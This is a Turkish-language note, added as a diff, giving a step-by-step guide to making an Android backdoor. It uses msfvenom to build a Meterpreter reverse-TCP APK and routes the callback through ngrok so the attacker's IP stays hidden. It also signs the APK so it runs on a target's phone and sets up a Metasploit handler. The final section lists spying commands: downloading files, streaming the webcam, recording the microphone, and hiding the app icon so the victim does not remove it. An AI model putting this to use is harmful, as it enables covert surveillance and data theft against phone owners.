@@ -1,0 +1,41 @@
+BACKDOOR
+Terminal
+Ngrok : Kendi Local Serverımızı internete açmaya yarayan tünel servisi. Kendi public IP’mizi yazmak yerine ngrok sunucusunun IP’sini verip sonra bu ngrok ile Kali arasında bağalntı kurarsak hedefe gönderdiğimiz file içerisinde bizim public IP’miz bulunmaz.
+Ngrok sitesine girip kayıt oluyoruz. Connect your account başlığı altında bize bir token verecek onu kopyalayalım. Download Linux diyerek indirip zipten çıkartalım.
+./ngrok authtoken my_token_write
+//Bu komutla ngrok servisimiz çalışmaya hazır hale gelir
+./ngrok tcp 1453  :  tcp://0.tcp.ngrok.io:portNumber  --> localhost : 1453
+//portNumber ngrok portu ve ordan istekler bizim belirlediğimiz porta gelecek.
+
+Msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=portNumber R > /path/filename.apk
+-p ( payload ) işletim_sistemi/kurulacak_bağlantı/hedeften_bize_bağlantı
+LHOST ve LPORT ile ngrok servisine gidiyor . Buraya cevap gelirse bize yönlendirilecek. R ile dosyanın hangi klasöre oluşturulacağı belirlenir. Uzantısnın .apk olması önemli.
+
+Service postgresql start : Metasploit bu veritabanını kullanıyor daha iyi çalışması için bunu başlatıyoruz.
+Msfconsole
+Msf5 > use exploit/multi/handler : Kullanılacak modül . Multi handler çok amaçlı program anlamında.
+Msf5 > exploit(multi/handler) > set payload android/meterpreter/reverse_tcp : Kullanılacak payload.
+Msf5 > set LHOST 0.0.0.0 : Kendi localimizde olan birisinden gelecek data dinlenmeyece onun için 0…
+Msf5 > set LPORT 1453 : Ngrok servisinden gelen veriler bu porttan dinlencek. #show options
+Msf5 > exploit -j -z : Bu exploiti arkaplanda yap anlamına geliyor -j -z . 
+# Tek geriye kalan işlem oluşturulan .apk dosyasının hedef kullanıcıya gönderilmesi. Fakat bundan önce oluşturulan dosyanın imzalanması gerekir yoksa büyük ihtimalle çalışmaz. 
+Windows’a download edelim imzalamak için fakat bir de JDK’ya ihtiyacımız var . İmzalamak demek yapılan programın geliştiricisinin belirtilmesidir. Dosyayı imzalamak için 2 tane işlem yapmamız gerekiyor.
+1.	: Key.Store adında bir dosya oluşturmak . Şifre oluşturulur sonraki soruları boş bırıkılır en son soruya yes denilmesi gerek .
+keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+// filename.apk ve oluşturulan dosya aynı dizinde olmalı.
+2.	: Bu oluşturulan dosyayı kullanarak filename.apk dosyamızı imzalamak  
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore filename.apk alias_name
+// filename.apk msfvenom ile oluşturulan dosya ismi . Enterladıktan sonra şifre soracak oluşturduğumuz şifreyi giriyoruz .
+
+#Birleştirme işleminden sonra telefonumuza indirelelim ve çalıştıralım . Çalıştırdıktan sonra msfconsole geçip bağlantı mı gelmiş mi bakalım.
+
+Msf5 > session -l  : Var olan sessionlar gözükür
+Msf5 > session 1  : Açılan bağlantıya giriş yapılır.
+Msf5 > ls : Hangi klasörde olduğumuzu gösterir . cd .. , pwd çalıştırabiliriz
+Msf5 > download filename : Dosya indirilir
+Msf5 > webcam_stream : Kamera açarılır.Fakat Linux ekranında gözükmez bize bir html adresi verilir . Bunu browsera kopyalayıp çalıştırırsak görüntü gelir .Webcam_snap ss alır.
+Hide_app_icon : İndirilen uygulamanın iconu gizlenir kullanının silmemesi için.
+Record_mic : Ses kayıt etme.
+Background : Sessionu arkaplana atar 
+
+
